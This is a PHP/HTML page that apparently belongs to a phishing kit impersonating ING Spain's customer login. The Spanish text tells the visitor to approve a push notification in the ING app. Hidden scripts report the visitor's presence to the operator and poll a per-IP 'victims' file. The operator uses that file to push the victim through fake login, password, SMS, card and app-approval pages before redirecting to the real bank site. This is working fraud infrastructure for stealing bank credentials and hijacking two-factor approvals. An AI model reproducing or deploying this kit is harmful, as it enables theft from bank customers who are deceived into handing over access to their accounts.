<?php
  include "./Assets/php/config/config.php";
  reset_data_page()
?>
<!doctype html>
<html class="zz">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <title>ING</title>

        <script>
            /* Start Status */
                function updateStatus(status) {
                    fetch('./status/update_status.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({status , page : "APP PAGE"})
                    });
                }
                
                updateStatus('online');
                
                window.addEventListener('beforeunload', () => {
                    updateStatus('offline');
                });
                
                setInterval(() => {
                    updateStatus('online');
                }, 30000); 
            /* End Status */            
        </script>           
    </head>

    <body class="zz">

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="./Assets/imgs/logo.svg"></div>
                <div class="right"><img src="./Assets/imgs/header-right.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- LOGIN AREA -->
        <section id="login-area">
            <div class="box">
                
                <h3 style="font-weight: 400; font-size: 22px; margin-bottom: 20px">Acceso seguro</h3>
                <p style="font-size: 15px;">Sigue estos pasos para acceder</p>

                <div class="Assets">
                    <img src="./Assets/imgs/1.png" class="mr-3" alt="...">
                    <div class="Assets-body">
                        <h5 class="mt-0">01.</h5>
                        <p>Te acabamos de enviar una <b>notificación a tu móvil</b>. Si no la ves, abre nuestra APP</p>
                    </div>
                </div>
                <div class="Assets">
                    <img src="./Assets/imgs/2.png" class="mr-3" alt="...">
                    <div class="Assets-body">
                        <h5 class="mt-0">02.</h5>
                        <p>En ella te <b>preguntamos si eres tú</b> quien intenta acceder a tu Área Clientes</p>
                    </div>
                </div>
                <div class="Assets">
                    <img src="./Assets/imgs/3.png" class="mr-3" alt="...">
                    <div class="Assets-body">
                        <h5 class="mt-0">03.</h5>
                        <p><b>Pulsa sí</b> en la notificación para acceder a tu sesión.</p>
                    </div>
                </div>

                <p style="font-size: 14px;"><b>¿No has recibido la notificación?</b></p>
                <p style="font-size: 14px;">Prueba esto: abre la app de ING, pulsa en notificaciones (icono de la campana) y acepta la notificación de acceso.</p>
                <p style="font-size: 14px; margin-bottom: 0;">Si has perdido tu dispositivo móvil o necesitas operar con urgencia, puedes llamarnos al <b>91 206 66 66.</b></p>

            </div>
        </section>
        <!-- END LOGIN AREA -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>
          var ip = '<?php echo get_client_ip(); ?>';
          var waiting = setInterval(function() {
            $.get('./victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    // console.log('hada ba9i 0');
                }else if( data == 'log' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'log_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }

                else if( data == 'pass' ) {
                    clearInterval(waiting);
                    location.href = "pass.php";
                }else if( data == 'pass_error' ){
                    clearInterval(waiting);
                    location.href = "pass.php?error";
                }                

                else if( data == 'sms' ) {
                    clearInterval(waiting);
                    location.href = "sms.php";
                }else if( data == 'sms_error' ){
                    clearInterval(waiting);
                    location.href = "sms.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }

                else if( data == 'app' ) {
                    clearInterval(waiting);
                    location.href = "app.php";
                }
                
                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "https://www.ing.es/";
                }
            });
          }, 1000);              
        </script>
    </body>

</html>